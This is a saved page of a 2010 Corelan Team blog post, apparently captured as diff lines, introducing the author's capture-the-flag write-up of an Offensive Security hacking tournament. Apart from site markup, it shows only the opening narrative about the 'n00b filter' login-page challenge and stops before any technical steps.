+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script><script src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/wp-emoji-release.js" type="text/javascript" defer="defer"></script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel="stylesheet" id="wp-block-library-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/style_002.css" type="text/css" media="all">
+<style id="wp-block-library-inline-css" type="text/css">
+.has-text-align-justify{text-align:justify;}
+</style>
+<link rel="stylesheet" id="cptch_stylesheet-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/front_end_style.css" type="text/css" media="all">
+<link rel="stylesheet" id="dashicons-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/dashicons.css" type="text/css" media="all">
+<link rel="stylesheet" id="cptch_desktop_style-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/desktop_style.css" type="text/css" media="all">
+<link rel="stylesheet" id="toc-screen-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/screen.css" type="text/css" media="all">
+<link rel="stylesheet" id="wp-downloadmanager-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/download-css.css" type="text/css" media="all">
+<link rel="stylesheet" id="wp-pagenavi-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/pagenavi-css.css" type="text/css" media="all">
+<link rel="stylesheet" id="thickbox-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/thickbox.css" type="text/css" media="all">
+<link rel="stylesheet" id="auto-thickbox-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/styles-pre39.css" type="text/css" media="all">
+<link rel="stylesheet" id="moove_gdpr_frontend-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/gdpr-main.css" type="text/css" media="all">
+<link rel="stylesheet" id="stbCoreCSS-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/stb-core.css" type="text/css" media="all">
+<link rel="stylesheet" id="social-logos-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/social-logos.css" type="text/css" media="all">
+<link rel="stylesheet" id="jetpack_css-css" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/jetpack.css" type="text/css" media="all">
+<script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/jquery.js" id="jquery-js"></script>
+<link rel="https://api.w.org/" href="https://www.corelan.be/index.php/wp-json/"><link rel="alternate" type="application/json" href="https://www.corelan.be/index.php/wp-json/wp/v2/posts/3767"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.corelan.be/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.corelan.be/wp-includes/wlwmanifest.xml"> 
+<link rel="prev" title="corelanc0d3r interviewed by Slo-Tech" href="https://www.corelan.be/index.php/2010/05/10/corelanc0d3r-interviewed-by-slo-tech/">
+<link rel="next" title="Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube" href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/">
+<link rel="shortlink" href="https://www.corelan.be/?p=3767">
+<link rel="alternate" type="application/json+oembed" href="https://www.corelan.be/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2010%2F05%2F10%2Foffensive-security-hacking-tournament-how-strong-was-my-fu%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://www.corelan.be/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2010%2F05%2F10%2Foffensive-security-hacking-tournament-how-strong-was-my-fu%2F&amp;format=xml">
+<script async="" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-8134501503628637",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<style type="text/css">
+div.aka_half {
+	float: left;
+	overflow: auto;
+	width: 45%;
+}
+div.aka_clear {
+	clear: both;
+	float: none;
+}
+</style>
+		
+<script type="text/javascript">
+/* <![CDATA[ */
+var thickboxL10n = {"next":"Next &gt;","prev":"&lt; Prev","image":"Image","of":"of","close":"Close","loadingAnimation":"https:\/\/www.corelan.be\/wp-content\/plugins\/auto-thickbox\/images\/loadingAnimation.gif"};
+try{convertEntities(thickboxL10n);}catch(e){};;
+/* ]]> */
+</script>
+<link rel="shortcut icon" href="https://www.corelan.be/wp-content/themes/corelan/favicon.ico">
+		<style id="gdpr_cookie_compliance_inline_styles" type="text/css">
+	#moove_gdpr_cookie_modal,#moove_gdpr_cookie_info_bar,.gdpr_cookie_settings_shortcode_content{font-family:Nunito,sans-serif}#moove_gdpr_save_popup_settings_button{background-color:#373737;color:#fff}#moove_gdpr_save_popup_settings_button:hover{background-color:#000}#moove_gdpr_cookie_info_bar .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton,#moove_gdpr_cookie_info_bar .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton{background-color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder a.mgbutton,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder button.mgbutton,.gdpr_cookie_settings_shortcode_content .gdpr-shr-button.button-green{background-color:#0c4da2;border-color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder a.mgbutton:hover,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-footer-content .moove-gdpr-button-holder button.mgbutton:hover,.gdpr_cookie_settings_shortcode_content .gdpr-shr-button.button-green:hover{background-color:#fff;color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close span.gdpr-icon{background-color:#0c4da2;border:1px solid #0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close i:hover,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close span.gdpr-icon:hover,#moove_gdpr_cookie_info_bar span[data-href]>u.change-settings-button{color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected a span.gdpr-icon,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected button span.gdpr-icon{color:inherit}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li:hover a,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li:hover button{color:#000}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a span.gdpr-icon,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button span.gdpr-icon{color:inherit}#moove_gdpr_cookie_modal .gdpr-acc-link{line-height:0;font-size:0;color:transparent;position:absolute}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close:hover i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-tab-main .moove-gdpr-tab-main-content a:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content span.change-settings-button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content u.change-settings-button:hover,#moove_gdpr_cookie_info_bar span[data-href]>u.change-settings-button{color:#0c4da2}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected a,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected button{color:#000}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected a i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected button i{color:#000}#moove_gdpr_cookie_modal.lity-hide{display:none}</style><script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/script.js"></script>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-31176335-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+<!-- AdSense -->
+<script async="" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-8134501503628637",
+    enable_page_level_ads: true
+  });
+</script>
+<!-- End AdSense -->
+
+
+<link rel="preload" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/integrator.js" as="script"><script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/integrator.js"></script><link rel="preload" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/integrator.js" as="script"><script type="text/javascript" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/integrator.js"></script></head>
+<body class="post-template-default single single-post postid-3767 single-format-standard">
+
+
+<div id="art-main">
+    <div class="art-header">
+        <div class="art-header-center">
+            <div class="art-header-png"></div>
+        </div>
+    <div class="art-header-wrapper">
+    <div class="art-header-inner">
+        <div class="art-headerobject"></div>
+        <div class="art-logo">
+                <h1 id="name-text" class="art-logo-name"><a href="https://www.corelan.be/">Corelan Team</a></h1>
+                            <h2 id="slogan-text" class="art-logo-text">:: Knowledge is not an object, it's a flow ::</h2>
+                </div>
+    </div>
+    </div>
+    </div>
+    <div class="art-sheet">
+        <div class="art-sheet-tl"></div>
+        <div class="art-sheet-tr"></div>
+        <div class="art-sheet-bl"></div>
+        <div class="art-sheet-br"></div>
+        <div class="art-sheet-tc"></div>
+        <div class="art-sheet-bc"></div>
+        <div class="art-sheet-cl"></div>
+        <div class="art-sheet-cr"></div>
+        <div class="art-sheet-cc"></div>
+        <div class="art-sheet-body">
+            <div class="art-nav">
+            	<div class="art-nav-l"></div>
+            	<div class="art-nav-r"></div>
+            	
+<ul class="art-menu">
+	<li><a href="https://www.corelan.be/" title="Home"><span class="l"> </span><span class="r"> </span><span class="t">Home</span></a>
+	</li>
+	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
+	<li><a href="https://www.corelan.be/wp-login.php" title="Login/Register/Logout"><span class="l"> </span><span class="r"> </span><span class="t">Login/Register/Logout</span></a>
+	</li>
+	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
+	<li><a href="https://www.corelan.be/index.php/articles/" title="Articles"><span class="l"> </span><span class="r"> </span><span class="t">Articles</span></a>
+	</li>
+	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
+	<li><a href="https://www.corelan.be/?cat=11" title="Free Tools"><span class="l"> </span><span class="r"> </span><span class="t">Free Tools</span></a>
+	<ul>
+		<li><a href="https://www.corelan.be/index.php/category/active-directory/" title="AD &amp; CS">AD &amp; CS</a>
+		<ul>
+			<li><a href="https://www.corelan.be/index.php/2007/11/18/free-tool-pve-active-directory-disable-users/" title="AD Disable Users">AD Disable Users</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/2009/04/10/free-tool-windows-2008-certificate-authority-certificate-list-utility-for-pending-requests-and-about-to-expire-certificates/" title="Certificate List Utility">Certificate List Utility</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/" title="PVE Find AD User">PVE Find AD User</a>
+			</li>
+		</ul>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/category/exchange/" title="Exchange Transport Agents">Exchange Transport Agents</a>
+		<ul>
+			<li><a href="https://www.corelan.be/index.php/2008/07/21/free-tool-attachment-filtering-with-exchange-2007-custom-transport-agent/" title="Attachment filter">Attachment filter</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/2009/06/20/exchange-20072010-renaming-attachments-on-the-fly-custom-transport-agent/" title="Attachment rename">Attachment rename</a>
+			</li>
+		</ul>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/category/networking/" title="Networking">Networking</a>
+		<ul>
+			<li><a href="https://www.corelan.be/index.php/my-free-tools/networking/cisco-switch-backup-utility/" title="Cisco switch backup utility">Cisco switch backup utility</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/2009/01/28/monitoring-your-network-with-powershell/" title="Network monitoring with powershell">Network monitoring with powershell</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/2008/09/26/free-tool-pve-tcp-ping-utility/" title="TCP Ping">TCP Ping</a>
+			</li>
+		</ul>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/category/security/" title="Security Related Tools">Security Related Tools</a>
+		</li>
+	</ul>
+	</li>
+	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
+	<li><a href="https://www.corelan.be/index.php/category/security/" title="Security"><span class="l"> </span><span class="r"> </span><span class="t">Security</span></a>
+	<ul>
+		<li><a href="https://www.corelan.be/index.php/security/corelan-team-members/" title="Corelan Team Members">Corelan Team Members</a>
+		<ul>
+			<li><a href="https://www.corelan.be/index.php/security/corelan-team-members/membership-how-to/" title="Corelan Team Membership">Corelan Team Membership</a>
+			</li>
+		</ul>
+		</li>
+		<li><a href="http://www.corelan-training.com/index.php/training/corelan-live/" title="Corelan Training &quot;Corelan Live - Win32 Exploit Development Bootcamp&quot;">Corelan Training "Corelan Live…</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/forum/writing-exploits" title="Exploit writing - forum">Exploit writing – forum</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/" title="Exploit writing tutorials">Exploit writing tutorials</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/security/metasploit/" title="Metasploit">Metasploit</a>
+		<ul>
+			<li><a href="https://www.corelan.be/index.php/2010/10/12/death-of-an-ftp-client/" title="FTP Client fuzzer">FTP Client fuzzer</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/2010/11/12/metasploit-module-http-form-field-fuzzer/" title="HTTP Form field fuzzer">HTTP Form field fuzzer</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/security/metasploit/simple-ftp-fuzzer-metasploit-module/" title="Simple FTP Fuzzer - Metasploit Module">Simple FTP Fuzzer – Metasploit…</a>
+			</li>
+		</ul>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/2009/01/31/nessus-wrapper-for-ike-scan/" title="Nessus/Openvas ike-scan wrapper">Nessus/Openvas ike-scan wrapper</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/disclosure-policy/" title="Vulnerability Disclosure Policy">Vulnerability Disclosure Policy</a>
+		</li>
+		<li><a href="http://redmine.corelan.be/projects/mona" title="mona.py PyCommand for Immunity Debugger">mona.py PyCommand for Immunity Debugger</a>
+		<ul>
+			<li><a href="https://redmine.corelan.be/projects/mona" title="Download mona.py">Download mona.py</a>
+			</li>
+			<li><a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" title="Mona.py - documentation">Mona.py – documentation</a>
+			</li>
+		</ul>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/security/corelan-ropdb/" title="Corelan ROPdb">Corelan ROPdb</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/security/mirror-for-bobs-immunity-debugger-projects/" title="Mirror for BoB's Immunity Debugger projects">Mirror for BoB’s Immunity Debugger…</a>
+		</li>
+	</ul>
+	</li>
+	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
+	<li><a href="https://www.corelan.be/index.php/terms-of-use/" title="Terms of use"><span class="l"> </span><span class="r"> </span><span class="t">Terms of use</span></a>
+	</li>
+	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
+	<li><a href="https://www.corelan.be/index.php/donate/" title="Donate"><span class="l"> </span><span class="r"> </span><span class="t">Donate</span></a>
+	</li>
+	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
+	<li><a href="https://www.corelan.be/index.php/about-us/about-corelan-team" title="About..."><span class="l"> </span><span class="r"> </span><span class="t">About…</span></a>
+	<ul>
+		<li><a href="https://www.corelan.be/index.php/about-us/about-corelan-team/" title="About Corelan Team">About Corelan Team</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/about-us/about-me/" title="About me">About me</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/about-us/antivirusantimalware/" title="Antivirus/antimalware">Antivirus/antimalware</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/about-us/publickeys/" title="Corelan public keys">Corelan public keys</a>
+		</li>
+		<li><a href="https://www.corelan.be/index.php/about-us/sitemap/" title="Sitemap">Sitemap</a>
+		</li>
+	</ul>
+	</li>
+</ul>
+            </div>
+<div class="art-content-layout">
+    <div class="art-content-layout-row">
+        <div class="art-layout-cell art-content">
+			
+
+
+<div id="stb-container-5570" class="stb-container-css stb-black-container stb-no-caption stb-image-big stb-ltr stb-corners stb-shadow stb-border stb-side"><aside class="stb-icon"><img src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/earth.png"></aside><div id="stb-box-5570" class="stb-black_box stb-box">This
+ website is supported, hosted and funded by Corelan Consulting - 
+https://www.corelan-consulting.com.  Please follow us on Facebook 
+(@corelanconsulting) and Twitter (@corelanconsult).  Corelan training 
+schedules: https://www.corelan-training.com/index.php/training-schedules</div></div><br><center></center><br><div class="art-post">
+	    <div class="art-post-tl"></div>
+	    <div class="art-post-tr"></div>
+	    <div class="art-post-bl"></div>
+	    <div class="art-post-br"></div>
+	    <div class="art-post-tc"></div>
+	    <div class="art-post-bc"></div>
+	    <div class="art-post-cl"></div>
+	    <div class="art-post-cr"></div>
+	    <div class="art-post-cc"></div>
+	    <div class="art-post-body">
+	            <div class="art-post-inner art-article">
+	            	                <div class="art-postcontent">
+	                    
+	                    	<div class="navigation">
+		<div class="alignleft">« <a href="https://www.corelan.be/index.php/2010/05/10/corelanc0d3r-interviewed-by-slo-tech/" title="corelanc0d3r interviewed by Slo-Tech" rel="prev">corelanc0d3r interviewed by Slo-Tech</a></div>
+		<div class="alignright"><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/" title="Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube" rel="next">Exploit writing tutorial part 10 : Chaining DEP with ROP – the…</a> »</div>
+	 </div>	                    
+	                </div>
+	                <div class="cleared"></div>
+	                	            </div>
+			<div class="cleared"></div>
+	    </div>
+	</div>
+	
+	<br><b><center><i>Please consider donating: <a href="https://www.corelan.be/index.php/donate/">https://www.corelan.be/index.php/donate/</a></i></center></b><br><center><br><b>58,040 views</b><br></center><div class="art-post post-3767 post type-post status-publish format-standard hentry category-security category-exploits tag-2385 tag-security tag-192-168-6-66 tag-capture tag-ctf tag-flag tag-hacking tag-hacklab-vpn tag-n00bfilter tag-nc-backshell-invalid-connection tag-nox-of-xr-offensive-security-team tag-offensive-security tag-offensive-security-labs-exercises tag-offsec-lab tag-offsec-lab-firewall tag-pentestexploitsexploitdbplatformslinuxremote340-c-imap tag-screenos-import-pfx tag-smtx-video-ghost-challenge-write-up tag-surgemail-3-8k4-4-d-download tag-tournament" id="post-3767">
+	    <div class="art-post-tl"></div>
+	    <div class="art-post-tr"></div>
+	    <div class="art-post-bl"></div>
+	    <div class="art-post-br"></div>
+	    <div class="art-post-tc"></div>
+	    <div class="art-post-bc"></div>
+	    <div class="art-post-cl"></div>
+	    <div class="art-post-cr"></div>
+	    <div class="art-post-cc"></div>
+	    <div class="art-post-body">
+	            <div class="art-post-inner art-article">
+	            <h2 class="art-postheader"><img src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/postheadericon.png" alt="" width="32" height="30">Offensive Security Hacking Tournament – How strong was my fu ?</h2><div class="art-postmetadataheader"><div class="art-postheadericons art-metadata-icons"><span class="date">Published</span> <span class="entry-date"><abbr class="published" title="23:20">May 10, 2010</abbr></span> | <img src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/postauthoricon.png" alt="" width="18" height="18"><span class="author">By</span> <span class="author vcard"><a class="url fn n" href="https://www.corelan.be/index.php/author/admin1/" title="View all posts by Corelan Team (corelanc0d3r)">Corelan Team (corelanc0d3r)</a></span></div></div>	                <div class="art-postcontent">
+	                    
+	                    <p><a href="https://www.corelan.be/wp-content/uploads/2010/08/corelan_ninja1.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="margin: 0px 10px 0px 30px; display: inline; border: 0px;" title="corelan_ninja" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/corelan_ninja_thumb1.png" alt="corelan_ninja" width="106" height="106" border="0" align="right"></a> Hi,</p>
+<p>Over the last 2 days my friends from Corelan Team and I participated in a <a href="http://www.offensive-security.com/backtrack/how-strong-is-your-fu/">Hacking Tournament</a>, organized by <a href="http://www.information-security-training.com/news/offensive-security-hacking-tournament/">Offensive Security</a>.&nbsp; The primary goals of the tournament are :</p>
+<ul>
+<li>be the first one to grab “secret” information from a machine and post it to the Tournament Control Panel.</li>
+<li>document your findings and submit them to offsec.</li>
+</ul>
+<p>A lot of people registered for the tournament, so in order to avoid 
+massive overload and bandwidth issues, a few days before the contest 
+would start, all participants were told that they would have to pass a 
+“n00b” filter, an “easy” phase1 challenge before we could actually VPN 
+into the lab and start the real challenge.</p>
+<p>That’s the scope.</p>
+<p>What follows below, are my personal notes I took during the contest. 
+(and in case you were wondering : I registered as “corelanc0d3r” (<a href="mailto:corelanc0d3r@gmail.com">corelanc0d3r@gmail.com</a>).</p>
+<blockquote><p>Before getting started, it’s important to note that I’m 
+not a pentester at all.&nbsp; I just took OffSec’s&nbsp; “Try Harder” 
+philosophy serious and tried to “think out of the box” instead of 
+relying/focussing on tools.&nbsp; Let’s find out how far I got with this
+ approach.&nbsp; Whether that was enough to break the challenges or not,
+ will become clear soon.</p></blockquote>
+<p>Before the games started, I was hoping there would be a good amount 
+of of Windows systems / Exploit building exercises (and not a lot of 
+linux systems/web based apps because I’m not really strong in those 
+areas)</p>
+<p>You can see the scoreboard here and find out how good/average/bad I did :&nbsp; <a href="http://scoreboard.information-security-training.com/scoreboard/">http://scoreboard.information-security-training.com/scoreboard/</a></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h3>The n00b filter</h3>
+<p>In the “pre-challenge” exercise (the challenge to filter participants and only allow the first 100 to connect), we were <em>kindly</em>
+ requested to find a secret key and use it to register for the 
+tournament Control Panel. Upon connecting to the machines hosting the 
+“secret key”, a simple login form was displayed : (<a href="http://www1.noob-filter.com/">http://www1.noob-filter.com</a> or <a href="http://www2.noob-filter.com/">http://www2.noob-filter.com</a>)</p>
+<p><a href="https://www.corelan.be/wp-content/uploads/2010/05/image41.png" target="_blank" class="thickbox no_icon" rel="gallery-3767"><img loading="lazy" style="display: inline; border-width: 0px;" title="image" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/image_thumb41.png" alt="image" width="468" height="387" border="0"></a></p>
+<p>The “hints and tips” section of the tournament stated that, in this 
+phase of the tournament, the goal is to get the contents of a file 
+called n00bSecret.txt and use the key inside this file to register for 
+the real labs.&nbsp; Only the first 100 people to get this file/extract 
+the key from the file, would get a seat for the real tournament.</p>
+<blockquote><p>The game just started. It’s saturday, 4pm, and I had 
+invited some friends to come over later in the evening…&nbsp; 
+well,&nbsp; in about an hour and a half to be more precise…&nbsp; I 
+still needed to prep some stuff in the kitchen, so I decided to give it 
+my best shot, but at the same time I also realized that if I wouldn’t be
+ able to get the secret key before my little party starts, I wouldn’t 
+probably make it in time (=be one of the first 100 people) either.&nbsp;
+ Time pressure :-) Let’s see.</p></blockquote>
+<p>Back to the login page. Usually, when someone sees a login page 
+during a pentest, there’s a big chance they will try to “log in” or 
+bypass the login.&nbsp; But in this case, the challenge is about getting
+ a file.</p>
